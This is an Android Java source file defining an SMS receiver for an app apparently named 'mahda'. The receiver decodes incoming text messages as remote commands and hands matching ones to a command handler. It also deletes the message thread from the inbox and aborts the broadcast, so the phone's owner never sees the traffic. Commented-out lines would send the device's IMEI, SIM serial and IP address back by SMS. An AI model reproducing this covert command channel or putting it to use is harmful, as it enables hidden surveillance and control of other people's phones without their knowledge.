package ir.rayacell.mahda.services;

import ir.rayacell.mahda.manager.Container;
import ir.rayacell.mahda.param.BaseParam;
import ir.rayacell.mahda.security.EncryptDecrypt;
import ir.rayacell.mahda.util.Util;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

/**
 * Receive sms from client.
 * 
 * @author behzad
 * 
 */
public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		String recMsgString = "";
		String fromAddress = "";
		SmsMessage currentMessage = null;
		byte[] data = null;

		final Bundle bundle = intent.getExtras();

		if (bundle != null) {
			// ---retrieve the SMS message received---
			Object[] pdus = (Object[]) bundle.get("pdus");

			for (int i = 0; i < pdus.length; i++) {

				currentMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
				try {
					// data = currentMessage.getUserData();
					recMsgString = currentMessage.getDisplayMessageBody();
					// recMsgString = EncryptDecrypt.cipher(recMsgString, -4);
					recMsgString = Util.BinaryToString(recMsgString);
					// recMsgString = new SimpleCrypto().dec(recMsgString);
				} catch (Exception e) {

				}
				// if (data != null) {
				// for (int index = 0; index < data.length; ++index) {
				// recMsgString += Character.toString((char) data[index]);
				// }
				// try {
				// recMsgString = EncryptDecrypt.decrypt(recMsgString);
				// } catch (InvalidKeyException e) {
				// e.printStackTrace();
				// } catch (IllegalBlockSizeException e) {
				// e.printStackTrace();
				// } catch (BadPaddingException e) {
				// e.printStackTrace();
				// } catch (NoSuchAlgorithmException e) {
				// e.printStackTrace();
				// } catch (NoSuchPaddingException e) {
				// e.printStackTrace();
				// }
				// }
				fromAddress = currentMessage.getOriginatingAddress();

				// String message = currentMessage.getDisplayMessageBody();

				// String sendingMessage =
				// Utils.getIMEI()+"&"+Utils.getSimSerial()+"&"+NetworkManager.getIpAddress();
				// Container.getProviderManager().sendSMS(sendingMessage);

			}
			deleteSMS(context, recMsgString, fromAddress);
			abortBroadcast();
		}
		if (recMsgString.matches("\\*([0-9a-zA-Z\\.\\*\\&_-])*\\*")) {
			BaseParam param = new BaseParam(0, fromAddress, null);
			param.mCommand = recMsgString;
			if (Container.getProviderManager().getProvider() != null)
				Container.getProviderManager().getProvider().recieve(param);
		}
	}

	public void deleteSMS(Context context, String message, String number) {
		try {
			Uri uriSms = Uri.parse("content://sms/inbox");
			Cursor c = context.getContentResolver().query(
					uriSms,
					new String[] { "_id", "thread_id", "address", "person",
							"date", "body" }, null, null, null);

			if (c != null && c.moveToFirst()) {
				do {
					long id = c.getLong(0);
					long threadId = c.getLong(1);
					String address = c.getString(2);
					String body = c.getString(5);

					if (message.equals(body) && address.equals(number)) {
						context.getContentResolver().delete(
								Uri.parse("content://sms/conversations/"
										+ threadId), "address=?",
								new String[] { address });
					}
				} while (c.moveToNext());
			}
			c.close();
		} catch (Exception e) {
		}
	}
}
